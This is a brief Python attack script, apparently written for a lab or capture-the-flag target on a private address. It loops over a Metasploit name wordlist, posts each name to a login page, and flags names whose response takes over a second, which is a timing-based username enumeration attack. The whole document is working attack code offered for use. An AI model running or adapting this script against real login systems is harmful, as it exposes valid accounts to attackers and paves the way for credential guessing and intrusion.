#!/usr/bin/env python3

import requests
import time

url = 'http://172.15.1.85:8080/login.php?username=guest&password=guest'

namesfile = open('/usr/share/wordlists/metasploit/namelist.txt', 'r')

for users in namesfile:


    username = {
            'username': users.strip(),
            'password': users
            }
    start = time.time()

    r = requests.post(url, data = username)

    end = time.time()

    delta = end - start
    if delta > 1:
        print(users)
